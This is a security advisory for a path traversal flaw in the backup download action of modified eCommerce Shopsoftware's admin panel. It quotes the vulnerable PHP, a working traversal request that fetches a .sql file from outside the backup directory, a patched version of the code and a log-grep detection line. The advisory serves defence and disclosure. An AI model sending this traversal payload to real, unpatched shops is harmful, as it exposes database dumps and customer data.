# Path Traversal in modified eCommerce Shopsoftware `admin/backup.php` — Arbitrary File Download

> **Identifier:** CVE pending
> **Affected:** modified eCommerce Shopsoftware ≤ 3.3.0 (rev 16825) — including current `main` as of 2026-11-19
> **Severity:** Medium · **CVSS 3.1:** 4.9 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`
> **CWE:** CWE-22 (Path Traversal) · CAPEC-139
> **Status:** Unpatched
> **Vendor notified:** 2026-11-19 — [modified-shop/modified-shop#3783](https://github.com/modified-shop/modified-shop/issues/3783)

---

## Summary

The `download` action of `admin/backup.php` reads a filename from `GET file`, checks only the last 3 characters (`.sql`/`zip`/`.gz`) and opens `DIR_FS_BACKUP . $_GET['file']` **without any `..` check or `realpath()` containment**. An authenticated admin can download any `.sql`/`.zip`/`.gz` file readable by the web server process, including database dumps and archives outside the webroot.

The `deleteconfirm` case in the same switch **does** check `strpos($_GET['file'], '..')` — the traversal guard was known but not applied consistently. Verified in current `main` (2026-11-19): `download` at line 89 has no check; `deleteconfirm` at line 104 does.

## Affected

| Component | Versions | Status |
|---|---|---|
| `admin/backup.php` (lines 89–99) | ≤ 3.3.0 rev 16825 → current `main` | Affected |

Repository: https://github.com/modified-shop/modified-shop · Evaluated stack: PHP 8.1.34, Apache 2.4, MariaDB 10.6 (authorized Docker lab).

## Vulnerable code

```php
// admin/backup.php:89 — no traversal check:
case 'download':
    $extension = substr($_GET['file'], -3);
    if (($extension == 'zip') || ($extension == '.gz') || ($extension == 'sql')) {
        if ($fp = fopen(DIR_FS_BACKUP . $_GET['file'], 'rb')) {   // ← no '..' check
            $buffer = fread($fp, filesize(DIR_FS_BACKUP . $_GET['file']));
            // ... served as a download
        }
    }

// :104 — the deleteconfirm case HAS the check:
case 'deleteconfirm':
    if (strpos($_GET['file'], '..') !== false) {
        xtc_redirect(xtc_href_link(FILENAME_BACKUP));
    }
```

## Exploitation

```http
GET /admin/backup.php?action=download&file=../../../../../../tmp/database_export.sql HTTP/1.1
Cookie: MODsid=<ADMIN_SESSION_ID>
```

`/var/www/html/admin/backups/../../../../../tmp/database_export.sql` resolves outside the backup directory; the file is returned as an attachment. Confirmed in authorized lab: a `.sql` file planted at `/tmp` (outside webroot) was downloaded via traversal. PoC in [`poc.sh`](poc.sh).

## Fix

```php
case 'download':
    if (strpos($_GET['file'], '..') !== false) {          // same guard as deleteconfirm
        xtc_redirect(xtc_href_link(FILENAME_BACKUP));
        break;
    }
    $real = realpath(DIR_FS_BACKUP . $_GET['file']);
    if ($real === false || strpos($real, realpath(DIR_FS_BACKUP)) !== 0) {
        xtc_redirect(xtc_href_link(FILENAME_BACKUP));
        break;
    }
    // ... existing logic using $real
```

Detection: `grep "backup.php.*download" access.log | grep "\.\."`

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-11-16 | Identified via code review; confirmed in authorized lab |
| 2026-11-19 | Verified still unpatched in `main` |
| 2026-11-19 | Advisory + PoC published (this repository) |
| 2026-11-19 | Vendor notified via GitHub issue |
| pending | CVE requested |

## Credits

- **Researchers:** Fernando Viana & Marcus Chaves
- **Contact:** nanduviana@gmail.com

## References

- Vendor notification: https://github.com/modified-shop/modified-shop/issues/3783
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- Vendor repository: https://github.com/modified-shop/modified-shop

---

*This advisory is published for educational, defensive, and security improvement purposes.*
